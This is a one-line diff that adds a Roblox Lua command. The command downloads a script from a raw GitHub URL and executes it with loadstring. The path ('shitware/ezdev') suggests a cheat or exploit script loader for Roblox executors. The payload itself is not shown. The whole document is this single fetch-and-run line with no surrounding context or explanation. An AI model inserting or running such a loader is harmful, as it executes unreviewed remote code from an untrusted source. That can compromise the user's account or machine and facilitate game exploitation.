@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/imvipp/roblox/main/shitware/ezdev/main.lua'))()
